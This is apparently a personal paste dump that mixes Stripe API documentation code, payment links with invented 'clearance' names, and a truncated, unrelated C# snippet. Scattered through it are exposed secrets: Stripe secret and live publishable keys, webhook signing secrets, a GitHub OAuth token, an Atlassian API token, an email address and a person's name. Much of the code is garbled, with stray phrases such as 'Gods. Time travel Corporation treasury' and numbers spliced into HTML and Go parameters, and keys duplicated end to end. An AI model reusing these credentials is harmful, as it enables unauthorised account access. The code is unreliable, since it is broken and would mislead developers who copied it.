plink_1OSBeOGF83d3fsgWcVksNMeW 2023-12-28 04:56 true usd https://buy.stripe.com/6oE5kwfBH3LL1RC9AJ Level 6 Advanced Signal Operator clearance
plink_1ORnXBGF83d3fsgWmwkhZHF4 2023-12-27 03:11 true usd https://buy.stripe.com/9AQ28k75bgyx8g03ck Cosmic Top Secret
plink_1ORljyGF83d3fsgW0M4xbYvh 2023-12-27 01:16 true usd https://buy.stripe.com/7sI3co2OV5TT53O28f Foundation Overseer Clearance
plink_1ORSOXGF83d3fsgWxamzmbrM 2023-12-26 04:37 true usd https://buy.stripe.com/3cs6oA0GNeqpeEoaEK Cosmic Top Secret
plink_1ORRl7GF83d3fsgWl73HO2i2 2023-12-26 03:56 true usd https://buy.stripe.com/14k8wI2OVdmldAkcMR Cosmic Top Secret
plink_1ORNr6GF83d3fsgWaDasufns 2023-12-25 23:46 true usd https://buy.stripe.com/14k3co617965cwg004 Foundation Overseer Clearance
plink_1ORDZbGF83d3fsgWiTOZdH7c 2023-12-25 12:47 true usd https://buy.stripe.com/bIY6oAblr5TTbscfZ1 npm install --save stripe
plink_1ORCGaGF83d3fsgW16ZOsM2H 2023-12-25 11:24 true usd https://buy.stripe.com/cN29AMexD3LLbsc5km MIB computational clearance
plink_1ORAL8GF83d3fsgWhNnLJJRw 2023-12-25 09:20 true usd https://buy.stripe.com/7sIcMY89f3LL53O145 Level 5 computational security clearance.
plink_1OR88lGF83d3fsgWCWiSir9E 2023-12-25 06:59 true usd https://book.stripe.com/14k6oAfBHfuteEo3cc

My payment links

fetch('https://{{sk_test_4eC39HqLyjWDarjtT1zdp7dc:}}/connection_token', { method: "POST" }); 
Connection token stripe

Webhook ID data stripe 

—header—
‘we_1Oa74JGF83d3fsgWfJ6n3SSa’

Webhook signing data 
—header—
‘whsec_PwrdbHDsw0GYve1NbZHjacu7g3nUH8Vu’

Item potency Key 
—header—
‘92281688-5a41-4be2-8e1b-ea48c81eae85’

// This is your Stripe CLI webhook secret for testing your endpoint locally.
        String endpointSecret = "whsec_da6d6364681be84689d4b526b26fd5a4d339eb3ec4dcdbab9047fd89909a6244";

Stripe charge automation api key 2337b090-a837-11ee-9efa-651583e247bf

access_token":"gho_16C7e42F292c6912E7710c838347Ae178B4a", "scope":"repo,gist", "token_type":"bearer" } Accept: application/xml <token_type>bearer</token_type> repo,gist <access_token>gho_16C7e42F292c6912E7710c838347Ae178B4a</access_token>
{
  "id": "cs_test_KdjLtDPfAjT1gq374DMZ3rHmZ9OoSlGRhyz8yTypH76KpN4JXkQpD2G0",
  "object": "checkout.session",
  ...
  "customer": "cus_HQmikpKnGHkNwW",
  ...
}
client.payment_intents.create(
  {"amount": 1000, "currency": "usd", "automatic_payment_methods": {"enabled": True}},
  {"stripe_account": "{{CONNECTED_ACCOUNT_ID}}"},
)


import React, {useState} from 'react';
import ReactDOM from 'react-dom';
import {loadStripe} from '@stripe/stripe-js';
import {
  PaymentElement,
  Elements,
  useStripe,
  useElements,
} from '@stripe/react-stripe-js';

const CheckoutForm = () => {
  const stripe = useStripe();
  const elements = useElements();

  const [errorMessage, setErrorMessage] = useState(null);

  const handleSubmit = async (event) => {
    event.preventDefault();

    if (elements == null) {
      return;
    }

    // Trigger form validation and wallet collection
    const {error: submitError} = await elements.submit();
    if (submitError) {
      // Show error to your customer
      setErrorMessage(submitError.message);
      return;
    }

    // Create the PaymentIntent and obtain clientSecret from your server endpoint
    const res = await fetch('/create-intent', {
      method: 'POST',
    });

    const {client_secret: fcsess_client_secret_KRJTKvCY3IKoYTrW18EazcO3} = await res.json();

    const {error} = await stripe.confirmPayment({
      //`Elements` instance that was used to create the Payment Element
      elements,
      clientSecret,
      confirmParams: {
        return_url: 'https://example.com/order/123/complete',
      },
    });

    if (error) {
      // This point will only be reached if there is an immediate error when
      // confirming the payment. Show error to your customer (for example, payment
      // details incomplete)
      setErrorMessage(error.message);
    } else {
      // Your customer will be redirected to your `return_url`. For some payment
      // methods like iDEAL, your customer will be redirected to an intermediate
      // site first to authorize the payment, then redirected to the `return_url`.
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <PaymentElement />
      <button type="submit" disabled={!stripe || !elements}>
        Pay
      </button>
      {/* Show error message to your customers */}
      {errorMessage && <div>{errorMessage}</div>}
    </form>
  );
};

const stripePromise = loadStripe('pk_test_6pRNASCoBOKtIshFeQd4XMUh');

const options = {
  mode: 'payment',
  amount: 1099,
  currency: 'usd',
  // Fully customizable with appearance API.
  appearance: {
    /*...*/
  },
};
import {loadStripe} from '@stripe/stripe-js';

const stripe = await loadStripe('pk_test_TYooMQauvdEDq54NiTphI7jx');

const App = () => (
  <Elements stripe={stripePromise} options={options}>
    <CheckoutForm />
  </Elements>
);

ReactDOM.render(<App />, document.body);

   and run your server to test the endpoint at http://localhost:4242/webhook.
python3 -m flask run --port=4242
import '@stripe/stripe-js';
<!-- Somewhere in your site's <head> -->
<script src="https://js.stripe.com/v3" async></script>
// CommonJS module import
const {loadStripe} = require('@stripe/stripe-js/pure');
// ES module import
import {loadStripe} from '@stripe/stripe-js/pure';

// Stripe.js will not be loaded until `loadStripe` is called
const stripe = await loadStripe('pk_test_TYooMQauvdEDq54NiTphI7jx');
// CommonJS module import
const {loadStripe} = require('@stripe/stripe-js/pure');
// ES module import
import {loadStripe} from '@stripe/stripe-js/pure';

loadStripe.setLoadParameters({advancedFraudSignals: false});
const stripe = await loadStripe('pk_test_TYooMQauvdEDq54NiTphI7jx');

Server
Download the CLI
Use the Stripe CLI to test your webhook locally. Download the CLI and log in with your Stripe account. Alternatively, use a service like ngrok to make your local endpoint publicly accessible.
stripe login

Run in the Stripe Shell
Server
Forward events to your webhook
Set up event forwarding with the CLI to send all Stripe events in testmode to your local webhook endpoint.
stripe listen --forward-to localhost:4242/webhook

Run in the Stripe Shell
Server
Simulate events
Use the CLI to simulate specific events that test your webhook application logic by sending a POST request to your webhook endpoint with a mocked Stripe event object.
stripe trigger payment_intent.succeeded

Run in the Stripe Shell
Server

docker pull stripe/stripe-cli
sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq
pk_test_51OR5ePGF83d3fsgWcl7ad29rrqOUNvjdYXN1JrElZlEyDloYQpFPuxSeRZH8KiCgvshlSaDYnuu1xxYiiWOCHj7W00Nrph1csX
stripe.Key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
params := &stripe.BalanceParams{};
result, err := balance.Get(params);
RESPONSE
{
  "object": "balance",
  "available": [
    {
      "amount": 666670,
      "currency": "usd",
      "source_types": {
        "card": 666670
      }
    }
  ],
  "connect_reserved": [
    {
      "amount": 0,
      "currency": "usd"
    }
  ],
  "livemode": false,
  "pending": [
    {
      "amount": 61414,
      "currency": "usd",
      "source_types": {
        "card": 61414
      }
    }
  ]
}
{
  "id": "txn_1MiN3gLkdIwHu7ixxapQrznl",
  "object": "balance_transaction",
  "amount": -400,
  "available_on": 1678043844,
  "created": 1678043844,
  "currency": "usd",
  "description": null,
  "exchange_rate": null,
  "fee": 0,
  "fee_details": [],
  "net": -400,
  "reporting_category": "transfer",
  "source": "tr_1MiN3gLkdIwHu7ixNCZvFdgA",
  "status": "available",
  "type": "transfer"
}
stripe.Key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
params := &stripe.CustomerParams{
  Description: stripe.String("My First Test Customer (created for API docs at https://www.stripe.com/docs/api)"),
}
params.SetIdempotencyKey("KG5LxwFBepaKHyUD")
cus, err := customer.New(params)

Dashboard — grateful345i@gmail.com
Related
payment_link — plink_1OmXKNGF83d3fsgWZ9eDGRLG
Idempotency
Key — a4ac8cde-61a3-415e-9d1c-e917423968cd

Origin
https://dashboard.stripe
// Set your secret key. Remember to switch to your live secret key in production.
// See your keys here: https://dashboard.stripe.com/apikeys
stripe.Key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
pup_specialist

financial_connections_specialist

data_migration_specialist

dispute_analyst

dispute_analyst

issuing_support_agent

identity_view_only

identity_analyst

developer

transfer_analyst

iam_admin

admin

# Make sure your project is using Go Modules
go mod init
# Install stripe-go
go get -u github.com/stripe/stripe-go/v76
app.go
Go

THE VERIFICATIONSESSION OBJECT
{
  "id": "vs_1NuNAILkdIwHu7ixh7OtGMLw",
  "object": "identity.verification_session",
  "client_secret": "...",
  "created": 1695680526,
  "last_error": null,
  "last_verification_report": null,
  "livemode": false,
  "metadata": {},
  "options": {
    "document": {
      "require_matching_selfie": true
    }
  },
  "redaction": null,
  "status": "requires_input",
  "type": "document",
  "url": "..."
}
Create a VerificationSession

Creates a VerificationSession object.
After the VerificationSession is created, display a verification modal using the session client_secret or send your users to the session’s url.
If your API key is in test mode, verification checks won’t actually process, though everything else will occur as if in live mode.
Related guide: Verify your users’ identity documents
Parameters


type
enum
Required
The type of verification check to be performed.
Possible enum values
document
Document check.
id_number
ID number check.

metadata
dictionary
Set of key-value pairs that you can attach to an object. This can be useful for storing additional information about the object in a structured format. Individual keys can be unset by posting an empty value to them. All keys can be unset by posting an empty value to metadata.

options
dictionary
A set of options for the session’s verification checks.
Hide child parameters

options.document
dictionary
Options that apply to the document check.
Hide child parameters

options.document.allowed_types
array of enums
Array of strings of allowed identity document types. If the provided identity document isn’t one of the allowed types, the verification check will fail with a document_type_not_allowed error code.
Possible enum values
driving_license
Drivers license document type.
id_card
ID card document type.
passport
Passport document type.

options.document.require_id_number
boolean
Collect an ID number and perform an ID number check with the document’s extracted name and date of birth.

options.document.require_live_capture
boolean
Disable image uploads, identity document images have to be captured using the device’s camera.

options.document.require_matching_selfie
boolean
Capture a face image and perform a selfie check comparing a photo ID and a picture of your user’s face. Learn more.

return_url
string
The URL that the user will be redirected to upon completing the verification flow.
Returns

Returns the created VerificationSession object
POST 
/v1/identity/verification_sessions
Server-side language

import stripe
stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.identity.VerificationSession.create(type="document")
RESPONSE
{
  "id": "vs_1NuN4zLkdIwHu7ixleE6HvkI",
  "object": "identity.verification_session",
  "client_secret": "...",
  "created": 1695680197,
  "last_error": null,
  "last_verification_report": null,
  "livemode": false,
  "metadata": {},
  "options": {},
  "redaction": null,
  "status": "requires_input",
  "type": "document",
  "url": "..."
}
Update a VerificationSession

Updates a VerificationSession object.
When the session status is requires_input, you can use this method to update the verification check and options.
Parameters


metadata
dictionary
Set of key-value pairs that you can attach to an object. This can be useful for storing additional information about the object in a structured format. Individual keys can be unset by posting an empty value to them. All keys can be unset by posting an empty value to metadata.

options
dictionary
A set of options for the session’s verification checks.
Show child parameters

type
enum
The type of verification check to be performed.
Possible enum values
document
Document check.
id_number
ID number check.
Returns

Returns the updated VerificationSession object
POST 
/v1/identity/verification_sessions/:id
Server-side language

import stripe
stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.identity.VerificationSession.modify(
  "vs_1NuN9WLkdIwHu7ix597AR9uz",
  type="id_number",
)
RESPONSE
{
  "id": "vs_1NuN9WLkdIwHu7ix597AR9uz",
  "object": "identity.verification_session",
  "client_secret": "...",
  "created": 1695680478,
  "last_error": null,
  "last_verification_report": null,
  "livemode": false,
  "metadata": {},
  "options": {},
  "redaction": null,
  "status": "requires_input",
  "type": "id_number",
  "url": "..."
}
Retrieve a VerificationSession

Retrieves the details of a VerificationSession that was previously created.
When the session status is requires_input, you can use this method to retrieve a valid client_secret or url to allow re-submission.
Parameters

No parameters.
Returns

Returns a VerificationSession object
GET 
/v1/identity/verification_sessions/:id
Server-side language

import stripe
stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.identity.VerificationSession.retrieve("vs_1NuNAILkdIwHu7ixh7OtGMLw")
RESPONSE
{
  "id": "vs_1NuNAILkdIwHu7ixh7OtGMLw",
  "object": "identity.verification_session",
  "client_secret": "...",
  "created": 1695680526,
  "last_error": null,
  "last_verification_report": null,
  "livemode": false,
  "metadata": {},
  "options": {
    "document": {
      "require_matching_selfie": true
    }
  },
  "redaction": null,
  "status": "requires_input",
  "type": "document",
  "url": "..."
}
List VerificationSessions

Returns a list of VerificationSessions
Parameters


created
dictionary
Only return VerificationSessions that were created during the given date interval.
Show child parameters

status
enum
Only return VerificationSessions with this status. Learn more about the lifecycle of sessions.
Possible enum values
canceled
The VerificationSession has been invalidated for future submission attempts.
processing
The session has been submitted and is being processed. Most verification checks are processed in less than 1 minute.
requires_input
Requires user input before processing can continue.
verified
Processing of all the verification checks are complete and successfully verified.
More parameters
Expand all


ending_before
string

limit
integer

starting_after
string
Returns

List of VerificationSession objects that match the provided filter criteria.
GET 
/v1/identity/verification_sessions
Server-side language

import stripe
stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.identity.VerificationSession.list(limit=3)
RESPONSE
{
  "object": "list",
  "url": "/v1/identity/verification_sessions",
  "has_more": false,
  "data": [
    {
      "id": "vs_1NuNAILkdIwHu7ixh7OtGMLw",
      "object": "identity.verification_session",
      "client_secret": "...",
      "created": 1695680526,
      "last_error": null,
      "last_verification_report": null,
      "livemode": false,
      "metadata": {},
      "options": {
        "document": {
          "require_matching_selfie": true
        }
      },
      "redaction": null,
      "status": "requires_input",
      "type": "document",
      "url": "..."
    }
    {...}
    {...}
  ],


// Then import the package
import (
  "github.com/stripe/stripe-go/v76"
)
Add a button to your website
Client-side
Create a button on your website for starting the verification.

HTML + JS

React
Add a button
Start by adding a verify button to your page:
verification.html


<html>
  <head>
    <title>Verify your identity</Owner_Keith_Bieszczat>
  </head>
  <body>
    <button id="verify-button">Verify</button>
  </body>
</html>
Add the Stripe.js library to your page
Add Stripe.js to your page by including a script tag in your HTML document:
verification.html


<html>
  <head>
    <title>Verify your identity</owner_keith_bieszczat>
    <script src="https://js.stripe.com/v3/"></script>
  </head>
  <body>
    <button id="verify-button">Verify</button>
  </body>
</html>
Note
Always load Stripe.js directly from https://js.stripe.com. You can’t include it in a bundle or self-host it.
Initialize Stripe.js
Initialize Stripe.js with your publishable API key by passing the following JavaScript to your page:
verification.html


<html>
  <head>
    <title>Verify your identity</Gods. Time travel
Corporation treasury 

12100236223317766

000000001>
    <script src="https://js.stripe.com/v3/"></script>
  </head>
  <body>
    <button id="verify-button">Verify</button>
    <script type="text/javascript">

      var stripe = Stripe('pk_test_51OR5ePGF83d3fsgWcl7ad29rrqOUNvjdYXN1JrElZlEyDloYQpFPuxSeRZH8KiCgvshlSaDYnuu1xxYiiWOCHj7W00Nrph1csX''pk_test_51OR5ePGF83d3fsgWcl...iiWOCHj7W00Nrph1csX');
    </script>
  </body>
</html>
params := &stripe.CustomerParams{Email: stripe.String("{{grateful345i@gmail.com}}")};
result, err := customer.New(params);

// Set your secret key. Remember to switch to your live secret key in production.
// See your keys here: https://dashboard.stripe.com/apikeys
stripe.Key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"

params := &stripe.SetupIntentParams{
  Customer: stripe.String("{{var stripe = Stripe('pk_test_51OR5ePGF83d3fsgWcl7ad29rrqOUNvjdYXN1JrElZlEyDloYQpFPuxSeRZH8KiCgvshlSaDYnuu1xxYiiWOCHj7W00Nrph1csX');}}"),
  PaymentMethodTypes: []*string{stripe.String("us_bank_account")},
  PaymentMethodOptions: &stripe.SetupIntentPaymentMethodOptionsParams{
    USBankAccount: &stripe.SetupIntentPaymentMethodOptionsUSBankAccountParams{
      FinancialConnections: &stripe.SetupIntentPaymentMethodOptionsUSBankAccountFinancialConnectionsParams{
        Permissions: []*string{
          stripe.String(string(stripe.SetupIntentPaymentMethodOptionsUSBankAccountFinancialConnectionsPermissionPaymentMethod)),
          stripe.String(string(stripe.SetupIntentPaymentMetGods. Time travel
Corporation treasury 

12100236223317766

000000001)),
        },
      },
    },
  },
};
params.AddExtra(
  "payment_method_options[Gods. Time travel
Corporation treasury 

12100236223317766

000000001][financial_connections][prefetch][0]",
  "Walter/Wayne/Keith Bieszczat"
)
result, err := setupintent.New(params);
// Set your secret key. Remember to switch to your live secret key in production.
// See your keys here: https://dashboard.stripe.com/apikeys
stripe.Key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
<script async
  src="https://js.stripe.com/v3/buy-button.js">
</script>

<stripe-buy-button
  buy-button-id="buy_btn_1OmXLdGF83d3fsgWCgLk9wBj"
  publishable-key="pk_live_51OR5ePGF83d3fsgW22PwNtYiShCVYIsrzZq2WxlxN2UAaB2qEIu0aUFJzjJxPtNT3rAs0Rvdo9XIVPb7rRMaeo3W00ALk76MVR"
>
</stripe-buy-button>
params := &stripe.FinancialConnectionsAccountRefreshParams{
  Features: []*string{stripe.String("Walter")},
};
result, err := account.Refresh("{{black_001b}}", params);

var stripe = Stripe('pk_test_51OR5ePGF83d3fsgWcl7ad29rrqOUNvjdYXN1JrElZlEyDloYQpFPuxSeRZH8KiCgvshlSaDYnuu1xxYiiWOCHj7W00Nrph1csX');
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
stripe.api_key = 'sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq'

# Using Django
from django.http import HttpResponse

# You can find your endpoint's secret in your webhook settings
endpoint_secret = 'whsec_...'

@csrf_exempt
def my_webhook_view(request):
  payload = request.body
  sig_header = request.META['HTTP_STRIPE_SIGNATURE']
  event = None

  try:
    event = stripe.Webhook.construct_event(
      payload, sig_header, endpoint_secret
    )
  except ValueError as e:
    # Invalid payload
    return HttpResponse(status=400)
  except stripe.error.SignatureVerificationError as e:
    # Invalid signature
    return HttpResponse(status=400)

  # Handle the checkout.session.completed event
  if event['type'] == 'checkout.session.completed':
    # Retrieve the session. If you require line items in the response, you may include them by expanding line_items.
    session = stripe.checkout.Session.retrieve(
      event['data']['object']['id'],
      expand=['line_items'],
    )

    line_items = session.line_items
    # Fulfill the purchase...
    fulfill_order(line_items)

  # Passed signature verification
  return HttpResponse(status=200)

def fulfill_order(line_items):
  # TODO: fill me in
  print("Fulfilling order")

import stripe
stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.checkout.Session.list_line_items(
  "cs_test_a1enSAC01IA3Ps2vL32mNoWKMCNmmfUGTeEeHXI5tLCvyFNGsdG2UNA7mr",
)
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"

stripe.checkout.Session.expire(
  "cs_test_a1Ae6ClgOkjygKwrf9B3L6ITtUuZW4Xx9FivL6DZYoYFdfAefQxsYpJJd3",
)
{
  "id": "cn_1MxvRqLkdIwHu7ixY0xbUcxk",
  "object": "credit_note",
  "amount": 1099,
  "amount_shipping": 0,
  "created": 1681750958,
  "currency": "usd",
  "customer": "cus_NjLgPhUokHubJC",
  "customer_balance_transaction": null,
  "discount_amount": 0,
  "discount_amounts": [],
  "invoice": "in_1MxvRkLkdIwHu7ixABNtI99m",
  "lines": {
    "object": "list",
    "data": [
      {
        "id": "cnli_1MxvRqLkdIwHu7ixFpdhBFQf",
        "object": "credit_note_line_item",
        "amount": 1099,
        "amount_excluding_tax": 1099,
        "description": "T-shirt",
        "discount_amount": 0,
        "discount_amounts": [],
        "invoice_line_item": "il_1MxvRlLkdIwHu7ixnkbntxUV",
        "livemode": false,
        "quantity": 1,
        "tax_amounts": [],
        "tax_rates": [],
        "type": "invoice_line_item",
        "unit_amount": 1099,
        "unit_amount_decimal": "1099",
        "unit_amount_excluding_tax": "1099"
      }
    ],
    "has_more": false,
    "url": "/v1/credit_notes/cn_1MxvRqLkdIwHu7ixY0xbUcxk/lines"
  },
  "livemode": false,
  "memo": null,
  "metadata": {},
  "number": "C9E0C52C-0036-CN-01",
  "out_of_band_amount": null,
  "pdf": "https://pay.stripe.com/credit_notes/acct_1M2JTkLkdIwHu7ix/test_YWNjdF8xTTJKVGtMa2RJd0h1N2l4LF9Oak9FOUtQNFlPdk52UXhFd2Z4SU45alpEd21kd0Y4LDcyMjkxNzU50200cROQsSK2/pdf?s=ap",
  "reason": null,
  "refund": null,
  "shipping_cost": null,
  "status": "issued",
  "subtotal": 1099,
  "subtotal_excluding_tax": 1099,
  "tax_amounts": [],
  "total": 1099,
  "total_excluding_tax": 1099,
  "type": "pre_payment",
  "voided_at": null
}
The

stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq_key"
stripe.CreditNote.preview(
  invoice="in_1Nn8cq2eZvKYlo2CNDpusCKy",
  lines=[
    {
      "type": "invoice_line_item",
      "invoice_line_item": "il_1Nn8cq2eZvKYlo2CidbpuBZa",
      "quantity": 1,
    },
  ],
)
credit_note = stripe.CreditNote.retrieve('cn_1Nn8cq2eZvKYlo2C6rIUxWuM')
lines = credit_note.lines.list(limit=5)
RESPONSE
{
  "id": "cn_1Nn7fB2eZvKYlo2CuJ0wZBlA",
  "object": "credit_note",
  "amount": 1451,
  "amount_shipping": 0,
  "created": 1693952641,
  "currency": "usd",
  "customer": "cus_9s6XKzkNRiz8i3",
  "customer_balance_transaction": null,
  "discount_amount": 0,
  "discount_amounts": [],
  "effective_at": null,
  "invoice": "in_1Nn7fB2eZvKYlo2C7meA67Xp",
  "lines": {
    "object": "list",
    "data": [
      {
        "id": "cnli_1Nn7fB2eZvKYlo2Cp8nLMci9",
        "object": "credit_note_line_item",
        "amount": 951,
        "amount_excluding_tax": 951,
        "description": "My First Invoice Item (created for API docs)",
        "discount_amount": 0,
        "discount_amounts": [],
        "invoice_line_item": "il_1Nn7fB2eZvKYlo2ChKG2H1tv",
        "livemode": false,
        "quantity": 1,
        "tax_amounts": [
          {
            "amount": 152,
            "inclusive": false,
            "tax_rate": "txr_1Nn7fB2eZvKYlo2CcbF7zzmD",
            "taxability_reason": null,
            "taxable_amount": 799
          }
        ],
        "tax_rates": [
          {
            "id": "txr_1Nn7fB2eZvKYlo2CcbF7zzmD",
            "object": "tax_rate",
            "active": true,
            "country": "DE",
            "created": 1693952641,
            "description": "VAT Germany",
            "display_name": "VAT",
            "effective_percentage": null,
            "inclusive": false,
            "jurisdiction": "DE",
            "livemode": false,
            "metadata": {},
            "percentage": 19,
            "state": null,
            "tax_type": "vat"
          }
        ],
        "type": "invoice_line_item",
        "unit_amount": null,
        "unit_amount_decimal": null,
        "unit_amount_excluding_tax": "951"
      },
      {
        "id": "cnli_1Nn7fB2eZvKYlo2C7OxQLHdz",
        "object": "credit_note_line_item",
        "amount": 500,
        "amount_excluding_tax": 500,
        "description": "Service credit",
        "discount_amount": 0,
        "discount_amounts": [],
        "livemode": false,
        "quantity": 1,
        "tax_amounts": [],
        "tax_rates": [],
        "type": "custom_line_item",
        "unit_amount": 500,
        "unit_amount_decimal": "500",
        "unit_amount_excluding_tax": "500"
      }
    ],
    "has_more": false,
    "url": "/v1/credit_notes/cn_1Nn7fB2eZvKYlo2CuJ0wZBlA/lines"
  },
  "livemode": false,
  "memo": null,
  "metadata": {},
  "number": "ABCD-1234-CN-01",
  "out_of_band_amount": null,
  "pdf": "https://pay.stripe.com/credit_notes/acct_1032D82eZvKYlo2C/cnst_123456789/pdf?s=ap",
  "reason": null,
  "refund": null,
  "shipping_cost": null,
  "status": "issued",
  "subtotal": 1451,
  "subtotal_excluding_tax": 1451,
  "tax_amounts": [
    {
      "amount": 152,
      "inclusive": false,
      "tax_rate": "txr_1Nn7fB2eZvKYlo2CcbF7zzmD",
      "taxability_reason": null,
      "taxable_amount": 799
    }
  ],
  "total": 1451,
  "total_excluding_tax": null,
  "type": "pre_payment",
  "voided_at": null
}
Retrieve
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"

stripe.CreditNote.retrieve("cn_1MxvRqLkdIwHu7ixY0xbUcxk")

docker run --rm -it stripe/stripe-cli:latest
Log in to the CLI
Login and authenticate your Stripe user Account to generate a set of restricted keys. To learn more, see Stripe CLI keys and permissions.
Command Line


stripe login
Press the Enter key on your keyboard to complete the authentication process in your browser.
Output


Your pairing code is: enjoy-enough-outwit-win
This pairing code verifies your authentication with Stripe.
Press Enter to open the browser or visit https://dashboard.stripe.com/stripecli/confirm_auth?t=THQdJfL3x12udFkNorJL8OF1iFlN8Az1 (^C to quit)
Optionally, if you don’t want to use a browser, use the --interactive flag to authenticate with an existing API secret key or restricted key. This can be helpful when authenticating to the CLI without a browser, such as in a CI/CD pipeline.
Command Line


stripe login --interactive
Optionally, use the --api-key flag to specify your API secret key inline each time you send a request.
Command Line


stripe login --api-key sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh4...bxbcYsf8OF00CdDfT6Xq
ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069

curl -v https://mysite.atlassian.net --user me@example.com:my-api-token
Private key
SHA256:TvOWY3mZWlr9uMgny0PtyVdWFzAfKO98UgFlMzgP+ZA=
Added now by 6309304695
IP

  
// Set the current culture to Danish in Denmark.
  Thread.CurrentThread.CurrentCulture = new CultureInfo("da-DK");
  Console.WriteLine("Current culture: {0}", 
                    CultureInfo.CurrentCulture.Name);
  Console.WriteLine("Comparison of {0} with {1}: {2}", 
                    str1, str2, String.Compare(str1, str2));
  Console.WriteLine("Comparison of {0} with {1}: {2}\n", 
                    str2, str3, String.Compare(str2, str3));
  
  // Set the current culture to English in the U.S.
  Thread.CurrentThread.CurrentCulture = new CultureInfo("en-US");
  Console.WriteLine("Current culture: {0}", 
                    CultureInfo.CurrentCulture.Name);
  Console.WriteLine("Comparison of {0} with {1}: {2}", 
                    str1, str2, String.Compare(str1, str2));
  Console.WriteLine("Comparison of {0} with {1}: {2}\n", 
                    str2, str3, String.Compare(str2, str3));
  
  // Perform an ordinal comparison.
  Console.WriteLine("Ordinal comparison");
  Console.WriteLine("Comparison of {0} with {1}: {2}", 
                    str1, str2, 
                    String.Compare(str1, str2, StringComparison.Ordinal));
  Console.WriteLine("Comparison of {0} with {1}: {2}", 
                    str2, str3, 
                    String.Compare(str2, str3, StringComparison.Ordinal));

  // Perform a word sort using the current (en-US) culture.
  string[] current = new string[strings.Length]; 
  strings.CopyTo(current, 0); 
  Array.Sort(current, StringComparer.CurrentCulture);

  // Perform a word sort using the invariant culture.
  string[] invariant = new string[strings.Length];
  strings.CopyTo(invariant, 0); 
  Array.Sort(invariant, StringComparer.InvariantCulture);

  // Perform an ordinal sort.
  string[] ordinal = new string[strings.Length];
  strings.CopyTo(ordinal, 0); 
  Array.Sort(ordinal, StringComparer.Ordinal);

  // Perform a string sort using the current culture.
  string[] stringSort = new string[strings.Length];
  strings.CopyTo(stringSort, 0); 
  Array.Sort(stringSort, new SCompare());

  // Display array values
  Console.WriteLine("{0,13} {1,13} {2,15} {3,13} {4,13}\n", 
                    "Original", "Word Sort", "Invariant Word", 
                    "Ordinal Sort", "String Sort");
  for (int ctr = 0; ctr < strings.Length; ctr++)
     Console.WriteLine("{0,13} {1,13} {2,15} {3,13} {4,13}", 
                       strings[ctr], current[ctr], invariant[ctr], 
